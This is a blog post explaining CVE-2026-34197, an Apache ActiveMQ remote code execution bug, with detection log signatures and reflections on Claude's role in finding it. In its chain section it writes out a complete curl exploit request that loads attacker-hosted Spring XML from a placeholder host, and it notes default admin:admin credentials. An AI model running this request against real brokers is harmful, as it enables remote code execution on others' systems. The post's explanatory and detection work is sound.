+++
title = "Ten Minutes With Claude: The ActiveMQ Bug That Was Hiding for 13 Years"
date = "2026-04-07"
+++

# Ten Minutes With Claude: The ActiveMQ Bug That Was Hiding for 13 Years

Horizon3's Naveen Sunkavally published CVE-2026-34197 in April, and the title tells you the interesting part: "10 Minutes with Claude." The vulnerability is a 13-year-old RCE in Apache ActiveMQ Classic, found by an LLM doing a first pass over source code. The human did the gift-wrapping. The finding itself was 80% Claude.

## The bug that kept coming back

ActiveMQ Classic ships a web console on port 8161 with Jolokia, an HTTP-to-JMX bridge that exposes broker management as a REST API. In 2022, ThreatBook showed that an authenticated attacker could invoke JDK MBeans like `FlightRecorder` through Jolokia to write webshells (CVE-2022-41678). The fix restricted Jolokia to read-only by default and denied dangerous MBeans, but added a blanket allow for ActiveMQ's own MBeans so the console kept working:

```xml
<allow>
  <mbean>
    <name>org.apache.activemq:*</name>
    <attribute>*</attribute>
    <operation>*</operation>
  </mbean>
</allow>
```

That blanket allow is the whole story. Every operation on every ActiveMQ MBean became callable through Jolokia. The question was whether any of those operations could reach code execution. The answer, it turns out, was `addNetworkConnector`.

## The chain

ActiveMQ brokers can connect to each other in a network for load distribution. `addNetworkConnector(String)` sets up those bridges at runtime, and it accepts a discovery URI. ActiveMQ also has a VM transport, `vm://`, an in-process transport for embedding a broker inside an application. When a `vm://` URI references a broker that doesn't exist, ActiveMQ creates one on the fly, and it accepts a `brokerConfig` parameter telling it where to load configuration from, including remote URLs.

Chain those together and you get:

```bash
curl -s -X POST http://TARGET:8161/api/jolokia/ \
  -H "Content-Type: application/json" \
  -H "Origin: http://TARGET:8161" \
  -u admin:admin \
  -d '{
    "type": "exec",
    "mbean": "org.apache.activemq:type=Broker,brokerName=localhost",
    "operation": "addNetworkConnector",
    "arguments": ["static:(vm://rce?brokerConfig=xbean:http://ATTACKER:8888/payload.xml)"]
  }'
```

The `vm://` transport sees a non-existent broker, calls `BrokerFactory.createBroker()` with the attacker-controlled URL, the `xbean:` scheme tells ActiveMQ to treat it as Spring XML config, and Spring's `ResourceXmlApplicationContext` instantiates every bean in it. A `MethodInvokingFactoryBean` calling `Runtime.getRuntime().exec()` is the classic sink, the same one used in CVE-2023-46604, which is on CISA's KEV list.

## The unauthenticated bonus

The exploit needs credentials, but default `admin:admin` is common. And on ActiveMQ 6.0.0-6.1.1, CVE-2024-32114 removed the `/api/*` path from the web console's security constraints entirely, so Jolokia is completely unauthenticated there. On those versions, CVE-2026-34197 is an unauthenticated RCE. The patch (5.19.6, 6.2.5) removed the ability for `addNetworkConnector` to add `vm://` transports, which was never meant to be a remote operation.

## The detection side

Horizon3's writeup includes the log signature, which is the part I actually use:

```text
INFO | Establishing network connection from vm://localhost to vm://rce?create=true&brokerConfig=xbean:http://X.X.X.X:8888/payload.xml
WARN | Could not connect to remote URI: ... The configuration has no BrokerService instance
```

The WARN appears after the payload has already run. The broker repeats connection attempts several times, so there's a window. Other indicators: POSTs to `/api/jolokia/` containing `addNetworkConnector`, outbound HTTP from the broker process to unexpected hosts, and unexpected child processes from the Java process.

## What I think about the Claude part

The finding method is the part I keep turning over. Sunkavally's workflow: prompt Claude lightly, set up a target on the network, let it validate findings. Most of what it finds doesn't rise to CVE level. This one did, with a couple of basic prompts.

I've been skeptical of AI-assisted vuln hunting, mostly because the demos are cherry-picked. But this is a different shape: the LLM didn't find a bug by fuzzing or pattern-matching a known class. It read the allowlist, noticed the blanket `*` on operations, and asked what an attacker could do with `addNetworkConnector`. That's reasoning about a security boundary, not pattern matching. The human validated it, built the exploit chain, and shipped the writeup.

The uncomfortable part: this bug sat in the code for 13 years. The allowlist fix from 2022 was reviewed, shipped, and deployed, and the hole it left was invisible to everyone until an LLM read the config and asked the right question. I don't know if that means the LLMs are getting good or the review process was always this porous. Probably both.


---

*I'm Kshitij, a detection engineer looking for SOC/IR/CTI roles. If this was useful, [connect on LinkedIn](https://linkedin.com/in/kshitijchitnis) or [browse my GitHub](https://github.com/m0rphtail/).*
